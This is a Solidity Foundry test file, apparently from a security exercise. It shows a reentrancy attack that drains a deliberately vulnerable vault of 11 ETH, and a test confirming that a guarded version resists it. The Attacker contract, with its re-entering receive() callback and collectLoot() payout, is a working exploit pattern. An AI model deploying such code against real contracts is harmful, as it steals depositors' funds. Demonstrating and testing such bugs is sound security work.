// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Reentrancy Exploit Test (SEC-02)
// Run: forge test --match-path test/security/ReentrancyExploit.t.sol -vvv
//
// Tests:
// 1. Exploit: drain VulnerableVault via reentrancy
// 2. Defense: VulnerableVaultFixed prevents reentrancy

import "forge-std/Test.sol";
import "../../contracts/security/VulnerableVault.sol";
import "../../contracts/security/VulnerableVaultFixed.sol";

/// @dev Attacker contract that exploits VulnerableVault via receive() reentrancy
contract Attacker {
    VulnerableVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        owner = msg.sender;
    }

    /// @dev Start the attack: deposit 1 ETH then withdraw (triggering reentrancy loop)
    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    /// @dev Receive callback -- re-enters vault.withdraw() while balance mapping is stale
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    /// @dev Withdraw stolen funds to attacker EOA
    function collectLoot() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}

/// @dev Attacker contract that attempts to exploit VulnerableVaultFixed (should fail)
contract AttackerFixed {
    VulnerableVaultFixed public vault;
    address public owner;

    constructor(address _vault) {
        vault = VulnerableVaultFixed(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function collectLoot() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}

contract ReentrancyExploitTest is Test {
    VulnerableVault public vault;
    VulnerableVaultFixed public vaultFixed;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vault = new VulnerableVault();
        vaultFixed = new VulnerableVaultFixed();

        // Seed both vaults with 10 ETH from innocent users
        vm.deal(alice, 5 ether);
        vm.deal(bob, 5 ether);

        vm.prank(alice);
        vault.deposit{value: 5 ether}();

        vm.prank(bob);
        vault.deposit{value: 5 ether}();

        vm.prank(alice);
        vaultFixed.deposit{value: 5 ether}();

        vm.prank(bob);
        vaultFixed.deposit{value: 5 ether}();

        // Give attacker 1 ETH
        vm.deal(attacker, 1 ether);
    }

    // ---------------------------------------------------------------
    //  Exploit: VulnerableVault is drained
    // ---------------------------------------------------------------

    function test_reentrancyExploit() public {
        uint256 vaultBalanceBefore = address(vault).balance;
        assertEq(vaultBalanceBefore, 10 ether, "Vault should have 10 ETH");

        // Deploy attacker contract
        vm.prank(attacker);
        Attacker attackerContract = new Attacker(address(vault));

        // Execute attack with 1 ETH
        vm.prank(attacker);
        vm.deal(attacker, 1 ether);
        attackerContract.attack{value: 1 ether}();

        // Vault should be drained (0 or near 0)
        uint256 vaultBalanceAfter = address(vault).balance;
        assertEq(vaultBalanceAfter, 0, "Vault should be drained");

        // Attacker contract should have all 11 ETH (10 original + 1 deposited)
        uint256 attackerLoot = address(attackerContract).balance;
        assertEq(attackerLoot, 11 ether, "Attacker should have stolen all funds");

        // Collect loot
        uint256 attackerEOABefore = attacker.balance;
        vm.prank(attacker);
        attackerContract.collectLoot();
        assertEq(attacker.balance, attackerEOABefore + 11 ether);
    }

    // ---------------------------------------------------------------
    //  Defense: VulnerableVaultFixed prevents reentrancy
    // ---------------------------------------------------------------

    function test_fixedVaultPreventsReentrancy() public {
        uint256 vaultBalanceBefore = address(vaultFixed).balance;
        assertEq(vaultBalanceBefore, 10 ether, "Fixed vault should have 10 ETH");

        // Deploy attacker contract targeting fixed vault
        vm.prank(attacker);
        AttackerFixed attackerContract = new AttackerFixed(address(vaultFixed));

        // Attack should revert due to ReentrancyGuard
        vm.prank(attacker);
        vm.deal(attacker, 1 ether);
        // The attack() call itself succeeds (first withdraw works),
        // but re-entrant calls revert. Attacker only gets their 1 ETH back.
        attackerContract.attack{value: 1 ether}();

        // Fixed vault should still have 10 ETH (attacker only withdrew their own 1 ETH)
        uint256 vaultBalanceAfter = address(vaultFixed).balance;
        assertEq(vaultBalanceAfter, 10 ether, "Fixed vault should still have 10 ETH");

        // Attacker contract got only 1 ETH (their own deposit)
        uint256 attackerLoot = address(attackerContract).balance;
        assertEq(attackerLoot, 1 ether, "Attacker should only have their 1 ETH");
    }

    // ---------------------------------------------------------------
    //  Normal operation works on both
    // ---------------------------------------------------------------

    function test_normalWithdrawWorks() public {
        // Alice can withdraw from vulnerable vault normally
        uint256 aliceBalBefore = alice.balance;
        vm.prank(alice);
        vault.withdraw();
        assertEq(alice.balance, aliceBalBefore + 5 ether);
        assertEq(vault.balances(alice), 0);
    }

    function test_normalWithdrawWorksFixed() public {
        // Alice can withdraw from fixed vault normally
        uint256 aliceBalBefore = alice.balance;
        vm.prank(alice);
        vaultFixed.withdraw();
        assertEq(alice.balance, aliceBalBefore + 5 ether);
        assertEq(vaultFixed.balances(alice), 0);
    }
}
